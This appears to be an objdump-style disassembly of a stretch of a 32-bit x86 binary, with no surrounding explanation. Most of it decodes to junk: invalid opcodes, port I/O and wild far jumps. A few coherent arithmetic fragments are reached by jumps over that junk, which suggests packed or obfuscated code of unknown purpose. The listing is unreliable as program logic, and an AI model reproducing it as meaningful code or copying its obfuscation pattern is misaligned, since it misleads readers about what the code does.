  40c5df:	mov    ecx,0x93ff96a8
  40c5e4:	jmp    0x40c5c7
  40c5e6:	push   ebp
  40c5e7:	in     eax,dx
  40c5e8:	out    0x9a,eax
  40c5ea:	push   edx
  40c5eb:	or     al,0xc1
  40c5ed:	cmp    ch,BYTE PTR [esi+ebx*4]
  40c5f0:	enter  0x3b8,0xa8
  40c5f4:	push   cs
  40c5f5:	mov    bh,BYTE PTR [edi-0x40]
  40c5f8:	or     BYTE PTR [eax],cl
  40c5fa:	lahf   
  40c5fb:	inc    esi
  40c5fc:	lock sbb al,0x6e
  40c5ff:	mov    WORD PTR [ebx+eiz*1-0x3f],ss
  40c603:	popf   
  40c604:	rcr    DWORD PTR [edx],1
  40c606:	pop    eax
  40c607:	in     eax,0x39
  40c609:	jp     0x40c60e
  40c60b:	and    DWORD PTR ds:[ecx+eax*8+0x2a60ad1d],ebp
  40c613:	shr    BYTE PTR [esi-0x9194d7a],cl
  40c619:	(bad)  
  40c61a:	out    0x6d,eax
  40c61c:	jp     0x40c5f4
  40c61e:	out    0x4,eax
  40c620:	mov    edx,0xfc7518cb
  40c625:	sbb    BYTE PTR [edi],al
  40c627:	pop    ebp
  40c628:	and    edx,DWORD PTR [edx-0x742bc17e]
  40c62e:	fucom  st(2)
  40c630:	fwait
  40c631:	dec    edi
  40c632:	mov    al,0x58
  40c634:	pop    ss
  40c635:	loop   0x40c5ea
  40c637:	into   
  40c638:	jl     0x40c64c
  40c63a:	or     BYTE PTR [esi+edi*1+0xf8041a],al
  40c641:	cmp    eax,0xf0bd2b25
  40c646:	inc    eax
  40c647:	sub    bl,al
  40c649:	dec    edi
  40c64a:	loop   0x40c60e
  40c64c:	scas   al,BYTE PTR es:[edi]
  40c64d:	push   edi
  40c64e:	jbe    0x40c5d6
  40c650:	or     eax,DWORD PTR [eax]
  40c652:	inc    ebp
  40c653:	mov    ebp,0x802fd706
  40c658:	ror    cl,cl
  40c65a:	(bad)  
  40c65b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c65c:	jecxz  0x40c616
  40c65e:	inc    esp
  40c65f:	push   cs
  40c660:	shl    BYTE PTR [ebp-0x57],1
  40c663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c664:	or     dh,BYTE PTR [ecx]
  40c666:	imul   ecx,DWORD PTR [edi-0x13],0x66b7d3d
  40c66d:	or     ch,cl
  40c66f:	adc    BYTE PTR gs:[esi],ah
  40c672:	add    cl,bh
  40c674:	(bad)  
  40c675:	fsub   DWORD PTR [ebp-0x37f1b232]
  40c67b:	mov    ebx,DWORD PTR [edi+0x3c]
  40c67e:	std    
  40c67f:	inc    eax
  40c680:	ja     0x40c6c4
  40c682:	dec    ecx
  40c683:	dec    edi
  40c684:	sbb    al,0x57
  40c686:	push   0xffffffbe
  40c688:	cmp    al,0xcf
  40c68a:	test   al,0x90
  40c68c:	xchg   BYTE PTR [edx+eiz*8-0x52416879],dh
  40c693:	fmul   QWORD PTR [ebx]
  40c695:	mov    esi,0x6e78f2d
  40c69a:	pop    esi
  40c69b:	mov    WORD PTR [edi-0x2a6cf8c3],es
  40c6a1:	cdq    
  40c6a2:	idiv   DWORD PTR es:[edx-0xc54ff65]
  40c6a9:	(bad)  
  40c6ab:	xor    dh,BYTE PTR [ecx+0x1f08a18e]
  40c6b1:	add    BYTE PTR [edi+0x7a],dl
  40c6b4:	sahf   
  40c6b5:	push   0xffffff82
  40c6b7:	xchg   esp,eax
  40c6b8:	ins    DWORD PTR es:[edi],dx
  40c6b9:	mov    edx,DWORD PTR [edx+0x5b98a762]
  40c6bf:	jl     0x40c6ce
  40c6c1:	sbb    BYTE PTR [esi],ch
  40c6c3:	or     al,BYTE PTR [esi]
  40c6c5:	aam    0x9d
  40c6c7:	cs jg  0x40c73d
  40c6ca:	pusha  
  40c6cb:	cmp    eax,0x3d75f6b8
  40c6d0:	adc    cl,BYTE PTR ss:[ebx+0x27]
  40c6d4:	xor    eax,0x29fa466
  40c6d9:	leave  
  40c6da:	in     al,0xf2
  40c6dc:	sahf   
  40c6dd:	fstp   QWORD PTR [eax]
  40c6df:	jnp    0x40c690
  40c6e1:	and    al,0xee
  40c6e3:	cmp    dl,al
  40c6e5:	stos   BYTE PTR es:[edi],al
  40c6e6:	lds    eax,FWORD PTR [eax+0x45]
  40c6e9:	sub    DWORD PTR [edx],ebp
  40c6eb:	inc    edi
  40c6ec:	inc    esp
  40c6ed:	or     BYTE PTR [edi],bh
  40c6ef:	shr    BYTE PTR [ebx+0x3a],0xc5
  40c6f3:	adc    eax,0xb7882b5a
  40c6f8:	stc    
  40c6f9:	cmc    
  40c6fa:	mov    al,0x3c
  40c6fc:	out    dx,eax
  40c6fd:	das    
  40c6fe:	in     al,dx
  40c6ff:	cdq    
  40c700:	xlat   BYTE PTR ds:[ebx]
  40c701:	ficom  DWORD PTR [ecx]
  40c703:	jnp    0x40c6bf
  40c705:	pop    esp
  40c706:	dec    eax
  40c707:	ret    
  40c708:	rcr    dh,1
  40c70a:	daa    
  40c70b:	(bad)  
  40c70c:	sbb    BYTE PTR [ecx],dh
  40c70e:	cmp    esp,DWORD PTR [ebp+0x4c]
  40c711:	out    0x39,al
  40c713:	jg     0x40c6ad
  40c715:	and    al,0x2a
  40c717:	mov    ds:0x9886d8ab,eax
  40c71c:	test   ebp,ebx
  40c71e:	adc    cl,ah
  40c720:	ds hlt 
  40c722:	cmp    DWORD PTR [edi],edi
  40c724:	pusha  
  40c725:	cmc    
  40c726:	sub    eax,0xf96ca412
  40c72b:	pop    edx
  40c72c:	fwait
  40c72d:	sbb    BYTE PTR [ebx],bl
  40c72f:	stos   DWORD PTR es:[edi],eax
  40c730:	addr16 inc esi
  40c732:	inc    edi
  40c733:	push   edx
  40c734:	repnz cwde 
  40c736:	xor    al,0xc9
  40c738:	mov    al,ds:0x2196d4e8
  40c73d:	mov    bl,0x23
  40c73f:	add    ch,BYTE PTR [ecx+0x5e75a356]
  40c745:	cmp    BYTE PTR [esi+edi*8+0x163a850f],al
  40c74c:	push   edi
  40c74d:	inc    esi
  40c74e:	and    ecx,DWORD PTR [eax-0x1b]
  40c751:	sub    edi,DWORD PTR [edi-0x311cb1ae]
  40c757:	sahf   
  40c758:	and    al,0xe1
  40c75a:	nop
  40c75b:	add    ah,BYTE PTR [edi-0x50]
  40c75e:	add    dl,dl
  40c760:	lds    ebp,FWORD PTR [edx+ecx*4-0x2b]
  40c764:	jge    0x40c786
  40c766:	mov    fs,WORD PTR [edx-0xe0387f2]
  40c76c:	push   ecx
  40c76d:	fdivr  QWORD PTR [edi+0x61141345]
  40c773:	aaa    
  40c774:	cmp    esp,esp
  40c776:	xchg   ecx,eax
  40c777:	jle    0x40c77f
  40c779:	daa    
  40c77a:	sub    BYTE PTR [ecx],bh
  40c77c:	jo     0x40c7d4
  40c77e:	pop    ebp
  40c77f:	out    dx,eax
  40c780:	mov    eax,ds:0xb5218e32
  40c785:	call   0xa29ebd61
  40c78a:	std    
  40c78b:	and    al,0x6f
  40c78d:	jno    0x40c74c
  40c78f:	test   eax,0xa87de205
  40c794:	cli    
  40c795:	xchg   esp,eax
  40c796:	jl     0x40c77d
  40c798:	retf   0x79b1
  40c79b:	enter  0x49ec,0xa2
  40c79f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7a0:	int    0xee
  40c7a2:	adc    BYTE PTR [ecx+edx*2+0x217c7118],dl
  40c7a9:	sub    DWORD PTR [eax+0x28],ebp
  40c7ac:	adc    al,BYTE PTR [eax-0x79]
  40c7af:	jne    0x40c7b1
  40c7b1:	cmp    BYTE PTR [ebx],dh
  40c7b3:	loope  0x40c746
  40c7b5:	bound  ebx,QWORD PTR [edx+0x42748b04]
  40c7bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7bc:	pop    ecx
  40c7bd:	dec    esp
  40c7be:	jge    0x40c77c
  40c7c0:	(bad)  
  40c7c2:	pusha  
  40c7c3:	or     ecx,DWORD PTR [esi]
  40c7c5:	outs   dx,DWORD PTR ds:[esi]
  40c7c6:	leave  
  40c7c7:	mov    dh,0xc
  40c7c9:	imul   ecx,DWORD PTR [ebx-0x22],0xb066ee7d
  40c7d0:	ret    
  40c7d1:	iret   
  40c7d2:	mov    ds:0x6c1ebe9a,al
  40c7d7:	popa   
  40c7d8:	dec    esp
  40c7d9:	pop    edi
  40c7da:	shl    edx,0xdf
  40c7dd:	sub    dh,BYTE PTR [eax+0x4a]
  40c7e0:	inc    ebp
  40c7e1:	stc    
  40c7e2:	push   cs
  40c7e3:	jmp    0x40c7c8
  40c7e5:	aas    
  40c7e6:	adc    eax,0x532ec0db
  40c7eb:	jmp    0x40c812
  40c7ed:	mov    eax,0x14947fab
  40c7f2:	dec    edi
  40c7f3:	call   0x8259:0x800c036d
  40c7fa:	test   DWORD PTR [esi],edi
  40c7fc:	jmp    0x40c78a
  40c7fe:	jp     0x40c86a
  40c800:	push   0xf1c9d1b8
  40c805:	mov    ebx,0xe2339d12
  40c80a:	into   
  40c80b:	xor    ecx,DWORD PTR [ebx]
  40c80d:	pushf  
  40c80e:	and    eax,0x506e3f6c
  40c813:	cmp    al,0x4e
  40c815:	sbb    BYTE PTR [edi+0x1d44b352],dl
  40c81b:	popf   
  40c81c:	and    al,0x23
  40c81e:	push   es
  40c81f:	sub    bh,BYTE PTR [esi+ebx*1-0x45]
  40c823:	in     al,dx
  40c824:	sub    ch,BYTE PTR es:[ecx+esi*4+0x57]
  40c829:	jmp    0x8bdc:0x5df0e2bd
  40c830:	xchg   edi,eax
  40c831:	jl     0x40c7ba
  40c833:	push   esi
  40c834:	pop    ebx
  40c835:	jns    0x40c7ca
  40c837:	add    al,0x16
  40c839:	div    DWORD PTR [eax+0x58]
  40c83c:	mov    ds:0x40fd64b,al
  40c841:	xchg   al,dh
  40c843:	out    0xcf,eax
  40c845:	mov    ah,0xa4
  40c847:	xor    bh,BYTE PTR [ecx+0x25]
  40c84a:	cli    
  40c84b:	lock push ss
  40c84d:	mov    esi,0x798150cd
  40c852:	aam    0x29
  40c854:	lods   al,BYTE PTR ds:[esi]
  40c855:	out    0x3c,eax
  40c857:	adc    ecx,DWORD PTR [ebx-0x50]
  40c85a:	inc    edi
  40c85b:	pop    eax
  40c85c:	inc    eax
  40c85d:	xchg   edi,eax
  40c85e:	jnp    0x40c873
  40c860:	dec    ebx
  40c861:	in     al,dx
  40c862:	push   0x4
  40c864:	mov    ebx,0x4fab95b6
  40c869:	ror    DWORD PTR [ecx+0x27],cl
  40c86c:	mov    WORD PTR [ebp-0x20],0x2a7b
  40c872:	add    BYTE PTR [eax],al
  40c874:	mov    DWORD PTR [ebp-0x1c],0x718f
  40c87b:	mov    eax,DWORD PTR [ebp-0x20]
  40c87e:	jmp    0x40cc89
  40c883:	(bad)  
  40c884:	fisubr DWORD PTR [edx+0x36]
  40c887:	mov    esp,0x55fc93b6
  40c88c:	or     eax,0x72e0e3ac
  40c891:	jle    0x40c862
  40c893:	jmp    0x92ff876f
  40c898:	les    edi,FWORD PTR [esi-0x38537142]
  40c89e:	shl    ebx,0x2e
  40c8a1:	mov    ds:0x289caad3,al
  40c8a6:	aad    0xdf
  40c8a8:	iret   
  40c8a9:	pop    ebp
  40c8aa:	push   0xce5b1c82
  40c8af:	and    ebp,DWORD PTR [edi-0x13]
  40c8b2:	cmp    eax,ebx
  40c8b4:	nop
  40c8b5:	aaa    
  40c8b6:	cmp    bl,BYTE PTR [edx-0x9fedca6]
  40c8bc:	unpcklps xmm2,XMMWORD PTR [edx+eax*2-0x386912a6]
  40c8c4:	add    ch,BYTE PTR [ecx+ebp*4+0x4569fde6]
  40c8cb:	xor    esi,DWORD PTR [ecx-0x47]
  40c8ce:	jns    0x40c910
  40c8d0:	aas    
  40c8d1:	push   ecx
  40c8d2:	in     eax,dx
  40c8d3:	mul    BYTE PTR [ebp+0x62]
  40c8d6:	sti    
  40c8d7:	cmc    
  40c8d8:	mov    ebx,cs
  40c8da:	pop    esp
  40c8db:	data16 rcl bl,0x36
  40c8df:	pop    ds
  40c8e0:	mov    cl,0x3c
  40c8e2:	sbb    esi,esp
  40c8e4:	stos   BYTE PTR es:[edi],al
  40c8e5:	mov    WORD PTR [edi+edi*4-0x433bce11],gs
  40c8ec:	or     edi,DWORD PTR [edi]
  40c8ee:	xlat   BYTE PTR ds:[ebx]
  40c8ef:	sub    esp,ecx
  40c8f1:	sbb    esp,DWORD PTR [edx+0x1821561f]
  40c8f7:	xchg   edi,eax
  40c8f8:	dec    edi
  40c8f9:	push   ebx
  40c8fa:	sbb    ch,0xa7
  40c8fd:	sbb    cl,0x32
  40c900:	sti    
  40c901:	retf   
  40c902:	push   edx
  40c903:	xchg   ecx,eax
  40c904:	loope  0x40c936
  40c906:	cmp    eax,0xdcb707bf
  40c90b:	push   ebx
  40c90c:	mov    dl,0x3d
  40c90e:	xchg   esi,eax
  40c90f:	mov    eax,ds:0xda2b6909
  40c914:	mul    BYTE PTR [esi+0x3c]
  40c917:	imul   edi,DWORD PTR [eax+0x31],0x23477761
  40c91e:	imul   ebp,DWORD PTR [edi],0x3a
  40c921:	pop    es
  40c922:	mov    cl,0xb8
  40c924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c925:	stc    
  40c926:	cmp    al,0xc5
  40c928:	or     eax,0x118c161f
  40c92d:	jae    0x40c94b
  40c92f:	jmp    0x2928fa11
  40c934:	stc    
  40c935:	xor    al,0xd2
  40c937:	add    DWORD PTR [esi+0x8976ac],ecx
  40c93d:	jb     0x40c958
  40c93f:	push   es
  40c940:	jmp    FWORD PTR [ecx+0x3158c007]
  40c946:	xor    eax,0x98150746
  40c94b:	adc    esi,DWORD PTR [esi+0x31]
  40c94e:	fbld   TBYTE PTR [eax]
  40c950:	dec    ebx
  40c951:	sahf   
  40c952:	mov    al,ds:0x878ef1a1
  40c957:	cmp    eax,DWORD PTR [eax]
  40c959:	int3   
  40c95a:	jl     0x40c990
  40c95c:	fisttp DWORD PTR [esi-0x341391d7]
  40c962:	push   edi
  40c963:	and    eax,0xbc54471e
  40c968:	xchg   edx,eax
  40c969:	popf   
  40c96a:	xchg   edx,eax
  40c96b:	sar    DWORD PTR [eax],cl
  40c96d:	rol    edx,0x5a
  40c970:	mov    edi,0x412b1dea
  40c975:	test   DWORD PTR [ebx+0x23],ebx
  40c978:	xor    BYTE PTR [esp+edx*8-0x36109468],0xf0
  40c980:	(bad)  
  40c981:	popa   
  40c982:	out    dx,al
  40c983:	mov    cs,WORD PTR [esi-0x3e]
  40c986:	xchg   ebx,eax
  40c987:	inc    edx
  40c988:	push   ebp
  40c989:	popa   
  40c98a:	mov    ecx,0x6a10daed
  40c98f:	jo     0x40c963
  40c991:	sbb    esp,edi
  40c993:	aaa    
  40c994:	mov    ecx,0x8a6e5a1b
  40c999:	lds    edx,FWORD PTR [edi-0x44]
  40c99c:	push   ss
  40c99d:	call   0xf025:0x9fd66c30
  40c9a4:	mov    fs,WORD PTR [edx-0x2efed557]
  40c9aa:	fiadd  DWORD PTR [ebx+0x18b9460a]
  40c9b0:	shr    DWORD PTR [ecx+0x3ba30a00],1
  40c9b6:	mov    cl,BYTE PTR [eax-0x5e]
  40c9b9:	sti    
  40c9ba:	adc    edx,ebx
  40c9bc:	pop    edx
  40c9bd:	enter  0xb6e5,0x3d
  40c9c1:	inc    esi
  40c9c2:	add    BYTE PTR [ebp+0x1e025db6],dl
  40c9c8:	jmp    0x8c0:0xc596ab86
  40c9cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9d0:	out    0x80,al
  40c9d2:	mov    ebx,0x428edb3f
  40c9d7:	ds push es
  40c9d9:	bound  edi,QWORD PTR [ecx]
  40c9db:	out    0xce,eax
  40c9dd:	stc    
  40c9de:	or     BYTE PTR [eax],bh
  40c9e0:	jg     0x40ca36
  40c9e2:	out    dx,al
  40c9e3:	mov    esi,0x6ec50851
  40c9e8:	(bad)  
  40c9e9:	popa   
  40c9ea:	ret    0x2463
  40c9ed:	sub    DWORD PTR [eax-0x7b310823],0xffffffcc
  40c9f4:	lods   al,BYTE PTR ds:[esi]
  40c9f5:	jb     0x40c9f4
  40c9f7:	cwde   
  40c9f8:	cmc    
  40c9f9:	add    dl,ah
  40c9fb:	and    ah,BYTE PTR [edx-0x42]
  40c9fe:	ss inc edi
  40ca00:	and    BYTE PTR [ebp-0x277ec59f],dl
  40ca06:	cwde   
  40ca07:	iret   
  40ca08:	in     eax,dx
  40ca09:	jb     0x40ca4b
  40ca0b:	imul   edx,esi,0x60
  40ca0e:	lahf   
  40ca0f:	sahf   
  40ca10:	mov    al,ds:0x3e18fbbd
  40ca15:	int    0xfe
  40ca17:	jecxz  0x40c99f
  40ca19:	mov    ds:0xad1e3097,al
  40ca1e:	sbb    dl,BYTE PTR [esi+0x1b1ce8e0]
  40ca24:	fimul  WORD PTR [ecx-0x46]
  40ca27:	sub    DWORD PTR ds:0x6d647715,eax
  40ca2d:	inc    edi
  40ca2e:	add    eax,0x8525a7de
  40ca33:	cs pop esi
  40ca35:	call   0x69a1da74
  40ca3a:	xchg   al,dh
  40ca3c:	aam    0x3b
  40ca3e:	je     0x40ca63
  40ca40:	sub    BYTE PTR [ecx-0x29a6ecec],0x32
  40ca47:	jl     0x40ca87
  40ca49:	mov    al,0x9d
  40ca4b:	jb     0x40ca4a
  40ca4d:	sub    eax,0x85aa7408
  40ca52:	das    
  40ca53:	mov    dl,0x94
  40ca55:	xchg   ecx,eax
  40ca56:	jge    0x40ca97
  40ca58:	mov    ecx,0x680ba394
  40ca5d:	(bad)  
  40ca5e:	(bad)  
  40ca5f:	pop    ecx
  40ca60:	jb     0x40ca53
  40ca62:	sub    eax,0x5cfb2d86
  40ca67:	xchg   ebx,eax
  40ca68:	clc    
  40ca69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca6a:	bnd call 0x63298829
  40ca70:	out    dx,eax
  40ca71:	sub    al,0x71
  40ca73:	xchg   BYTE PTR [esi],dl
  40ca75:	fstp   DWORD PTR [eax-0x41]
  40ca78:	jbe    0x40cae5
  40ca7a:	mov    dl,0x24
  40ca7c:	int    0x6
  40ca7e:	in     eax,0x76
  40ca80:	inc    edx
  40ca81:	and    eax,0x43eeac89
  40ca86:	push   es
  40ca87:	xchg   esp,eax
  40ca88:	sub    al,0x9
  40ca8a:	(bad)  
  40ca8b:	pop    esp
  40ca8c:	retf   
  40ca8d:	test   eax,0x7f69807e
  40ca92:	div    BYTE PTR [edi-0xa]
  40ca95:	(bad)  
  40ca96:	outs   dx,BYTE PTR ds:[esi]
  40ca97:	cmp    ah,bh
  40ca99:	push   ss
  40ca9a:	inc    edi
  40ca9b:	pop    ss
  40ca9c:	and    ecx,ecx
  40ca9e:	mov    al,0x68
  40caa0:	jo     0x40ca99
  40caa2:	popa   
  40caa3:	or     al,0xf0
  40caa5:	inc    edx
  40caa6:	pop    eax
  40caa7:	pop    edi
  40caa8:	hlt    
  40caa9:	retf   0xcd89
  40caac:	push   0x27cd898a
  40cab1:	mov    edi,0x2a2f5786
  40cab6:	repnz shl BYTE PTR [edi],cl
  40cab9:	xchg   ecx,eax
  40caba:	sti    
  40cabb:	push   cs
  40cabc:	inc    eax
  40cabd:	lods   al,BYTE PTR ds:[esi]
  40cabe:	push   ds
  40cabf:	xchg   edx,eax
  40cac0:	xchg   ecx,eax
  40cac1:	sub    ebp,esi
  40cac3:	adc    esp,DWORD PTR [ebp+ebp*2+0x20161daf]
  40caca:	in     eax,0x3
  40cacc:	pop    ss
  40cacd:	(bad)  
  40cace:	jae    0x40ca9c
  40cad0:	push   0x6e
  40cad2:	andps  xmm1,XMMWORD PTR ds:0x1a3b5964
  40cad9:	mov    ?,edi
  40cadb:	(bad)  
  40cadc:	sub    eax,0x5d2b1085
  40cae1:	stos   BYTE PTR es:[edi],al
  40cae2:	leave  
  40cae3:	add    bh,BYTE PTR [esi]
  40cae5:	test   BYTE PTR [ebx+0x75140714],0x9f
  40caec:	into   
  40caed:	cld    
  40caee:	loopne 0x40cb0d
  40caf0:	fstp   TBYTE PTR [esi+0x4d]
  40caf3:	repnz retf 0x9bbe
  40caf7:	xor    al,0xb4
  40caf9:	jl     0x40caaf
  40cafb:	dec    esp
  40cafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cafd:	xchg   BYTE PTR [esi],ch
  40caff:	sub    bl,BYTE PTR [esi]
  40cb01:	stos   DWORD PTR es:[edi],eax
  40cb02:	and    DWORD PTR [edx+0x44],ebp
  40cb05:	xchg   DWORD PTR [ebx-0x4710fa71],esi
  40cb0b:	jmp    0x40cb34
  40cb0d:	jg     0x40cb5a
  40cb0f:	(bad)  
  40cb10:	int3   
  40cb11:	inc    ebx
  40cb12:	pop    ebp
  40cb13:	sub    eax,0x65d6562c
  40cb18:	push   ebp
  40cb19:	adc    BYTE PTR [edi],0x6b
  40cb1c:	xlat   BYTE PTR ds:[ebx]
  40cb1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb1e:	cmp    DWORD PTR [eax+edx*1+0x486c7e07],ecx
  40cb25:	jmp    0xded75ab8
  40cb2a:	dec    ebp
  40cb2b:	mov    ds:0x88630b44,eax
  40cb30:	mov    ds:0x82d4ba62,eax
  40cb35:	loope  0x40cae2
  40cb37:	mov    bl,0x62
  40cb39:	dec    esi
  40cb3a:	cdq    
  40cb3b:	xchg   DWORD PTR [edx+0x2da2eafc],esi
  40cb41:	popa   
  40cb42:	outs   dx,DWORD PTR ds:[esi]
  40cb43:	mov    bh,0x4c
  40cb45:	mov    DWORD PTR [ebp-0x71db1adb],ebp
  40cb4b:	ss scas al,BYTE PTR es:[edi]
  40cb4d:	in     eax,0xac
  40cb4f:	rcr    DWORD PTR [esi-0x23],0xb1
  40cb53:	mov    esp,0x255a3f95
  40cb58:	pop    ss
  40cb59:	push   ss
  40cb5a:	mov    bl,0xd2
  40cb5c:	test   bh,cl
  40cb5e:	inc    esp
  40cb5f:	mov    al,0x7c
  40cb61:	jbe    0x40cb7b
  40cb63:	shrd   DWORD PTR [ecx],ebp,0xfc
  40cb67:	test   ah,ah
  40cb69:	sar    ebx,0x36
  40cb6c:	inc    esi
  40cb6d:	mov    dh,0x48
  40cb6f:	popa   
  40cb70:	mov    bh,0x7c
  40cb72:	mov    bl,0x8e
  40cb74:	push   ss
  40cb75:	ds adc eax,0xe5ab19ab
  40cb7b:	jle    0x40cb62
  40cb7d:	sbb    esp,DWORD PTR [ebp-0x4710689d]
  40cb83:	test   eax,0xb2d24828
  40cb88:	inc    DWORD PTR ds:0xa83ef8ab
  40cb8e:	repz out dx,al
  40cb90:	mov    esp,0xcf8c7150
  40cb95:	inc    eax
  40cb96:	sbb    cl,BYTE PTR [esi]
  40cb98:	std    
  40cb99:	loope  0x40cbb8
  40cb9b:	mov    al,0xe1
  40cb9d:	and    al,0x3
  40cb9f:	inc    ebx
  40cba0:	mov    ah,0x41
  40cba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cba3:	push   edi
  40cba4:	mov    ah,0xbc
  40cba6:	mov    dl,0xbd
  40cba8:	cmc    
  40cba9:	(bad)  
  40cbaa:	dec    esi
  40cbab:	inc    edx
  40cbac:	retf   0xdaaa
  40cbaf:	push   ebx
  40cbb0:	xchg   ebx,eax
  40cbb1:	neg    BYTE PTR [ebx]
  40cbb3:	data16 xor al,0x8c
  40cbb6:	mov    ds:0x7843f363,al
  40cbbb:	jg     0x40cb5a
  40cbbd:	lahf   
  40cbbe:	jb     0x40cbc0
  40cbc0:	xchg   edx,eax
  40cbc1:	inc    edx
  40cbc2:	rcl    DWORD PTR [eax],cl
  40cbc4:	pop    eax
  40cbc5:	test   BYTE PTR [edx],ah
  40cbc7:	mov    ebx,DWORD PTR [ebx+0x7bbd25d6]
  40cbcd:	ins    BYTE PTR es:[edi],dx
  40cbce:	shl    DWORD PTR [eax+ecx*8],1
  40cbd1:	mov    al,ss:0x7fc37b91
  40cbd7:	cli    
  40cbd8:	jns    0x40cc4b
  40cbda:	(bad)  
  40cbdb:	rol    DWORD PTR ds:0x11068663,cl
  40cbe1:	or     DWORD PTR [ebp+0x49],edi
  40cbe4:	aaa    
  40cbe5:	cmp    eax,0xfc9f2fea
  40cbea:	fstp   QWORD PTR [edx]
  40cbec:	sbb    BYTE PTR [ecx+esi*4],al
  40cbef:	scas   eax,DWORD PTR es:[edi]
  40cbf0:	fisttp WORD PTR [ecx+0x29f40610]
  40cbf6:	data16 data16 and ch,BYTE PTR [ebx-0x4f]
  40cbfb:	mov    esp,esi
  40cbfd:	or     edi,DWORD PTR [edi+0x1ebdb99d]
  40cc03:	ds aam 0x48
  40cc06:	push   edi
  40cc07:	in     al,0x1b
  40cc09:	push   ebx
  40cc0a:	aam    0xfd
  40cc0c:	into   
  40cc0d:	xchg   ebx,eax
  40cc0e:	add    edx,DWORD PTR [edi+0x71]
  40cc11:	and    al,0x33
  40cc13:	mov    ebp,0x1b25949c
  40cc18:	out    0xa7,al
  40cc1a:	out    0x34,al
  40cc1c:	xor    eax,0x95eb1e78
  40cc21:	jne    0x40cbe2
  40cc23:	mov    al,ds:0xb90ce657
  40cc28:	retf   0xb3c7
  40cc2b:	mov    al,0xa6
  40cc2d:	sub    eax,DWORD PTR [eax]
  40cc2f:	pop    ecx
  40cc30:	jae    0x40cc70
  40cc32:	cs ret 0x2364
  40cc36:	inc    edi
  40cc37:	shr    DWORD PTR [ebp-0x37],0xd3
  40cc3b:	ja     0x40cc14
  40cc3d:	sysexit 
  40cc3f:	fucomp st(4)
  40cc41:	sub    edi,DWORD PTR [ebx]
  40cc43:	xchg   esp,eax
  40cc44:	ins    BYTE PTR es:[edi],dx
  40cc45:	push   ebx
  40cc46:	cmp    BYTE PTR [ecx],ah
  40cc48:	div    edx
  40cc4a:	jmp    0x554:0x6ac1e036
  40cc51:	mov    DWORD PTR [ebx-0x6a4d2c79],ebx
  40cc57:	sub    DWORD PTR [eax],ebx
  40cc59:	xor    DWORD PTR [edx+0x62],ecx
  40cc5c:	inc    esp
  40cc5d:	dec    edi
  40cc5e:	fcmove st,st(5)
  40cc60:	cli    
  40cc61:	fs stos DWORD PTR es:[edi],eax
  40cc63:	and    al,0xe
  40cc65:	dec    eax
  40cc66:	sub    ebx,DWORD PTR [edi+0x16c37045]
  40cc6c:	or     DWORD PTR [ecx+0x652e71b2],edi
  40cc72:	fiadd  DWORD PTR [esi]
  40cc74:	pop    ds
  40cc75:	xor    bh,BYTE PTR [ecx]
  40cc77:	xchg   esi,eax
  40cc78:	retf   
  40cc79:	adc    DWORD PTR [ebp+0x37],esi
  40cc7c:	cwde   
  40cc7d:	fnstsw WORD PTR ds:0xd188eb8c
  40cc83:	push   ds
  40cc84:	pop    esp
  40cc85:	inc    ebp
  40cc86:	xchg   edi,eax
  40cc87:	shl    DWORD PTR [eax],1
  40cc89:	mov    edx,DWORD PTR [ebp-0x1c]
  40cc8c:	mov    esi,DWORD PTR [ebp-0x28]
  40cc8f:	mov    ebx,DWORD PTR [ebp-0x24]
  40cc92:	add    eax,0xffffc948
  40cc97:	adc    edx,0xffff87b0
  40cc9d:	or     eax,esi
  40cc9f:	mov    esi,DWORD PTR [ebp-0x40]
  40cca2:	or     eax,esi
  40cca4:	or     edx,ebx
  40cca6:	mov    ebx,DWORD PTR [ebp-0x3c]
  40cca9:	mov    esi,DWORD PTR [ebp-0x38]
  40ccac:	or     edx,ebx
  40ccae:	mov    ebx,DWORD PTR [ebp-0x34]
  40ccb1:	sub    eax,esi
  40ccb3:	mov    esi,DWORD PTR [ebp-0x48]
  40ccb6:	sbb    edx,ebx
  40ccb8:	mov    ebx,DWORD PTR [ebp-0x44]
  40ccbb:	or     eax,esi
  40ccbd:	or     edx,ebx
  40ccbf:	add    eax,0x89b
  40ccc4:	jmp    0x40d0cf
  40ccc9:	popf   
  40ccca:	call   0xbabc:0x1b7c1940
  40ccd1:	pop    eax
  40ccd2:	out    0xe9,eax
  40ccd4:	jecxz  0x40cc88
  40ccd6:	xchg   DWORD PTR [eax-0x4120425c],edi
  40ccdc:	mov    esi,0xbebec492
  40cce1:	inc    edi
  40cce2:	into   
  40cce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cce4:	xchg   ecx,eax
  40cce5:	dec    eax
  40cce6:	inc    ecx
  40cce7:	jl     0x40cc8f
  40cce9:	sub    ebx,ebp
  40cceb:	sub    esi,DWORD PTR [edx+eiz*8-0x5e]
  40ccef:	mov    esi,esp
  40ccf1:	cli    
  40ccf2:	cmp    dl,al
  40ccf4:	imul   esi,DWORD PTR [ecx+eiz*4],0x2faf57ba
  40ccfb:	push   0xffffffba
  40ccfd:	add    eax,0xda017d02
  40cd02:	scas   eax,DWORD PTR es:[edi]
  40cd03:	jno    0x40ccf2
  40cd05:	xchg   esp,eax
  40cd06:	fst    st(7)
  40cd08:	div    bh
  40cd0a:	mov    edi,edx
  40cd0c:	(bad)  [edx+0x65d72d1f]
  40cd12:	into   
  40cd13:	pop    es
  40cd14:	(bad)  
  40cd16:	in     eax,0xcf
  40cd18:	xlat   BYTE PTR ds:[ebx]
  40cd19:	loopne 0x40cd1f
  40cd1b:	push   ebx
  40cd1c:	and    DWORD PTR [esi],ecx
  40cd1e:	dec    esp
  40cd1f:	lods   al,BYTE PTR ds:[esi]
  40cd20:	(bad)  
  40cd21:	(bad)  
  40cd22:	sbb    eax,DWORD PTR fs:[ecx-0xa]
  40cd26:	jle    0x40cce7
  40cd28:	xchg   ebx,eax
  40cd29:	jmp    0x4337:0xeea3b93c
  40cd30:	add    edx,0x33
  40cd33:	enter  0xb19,0xe6
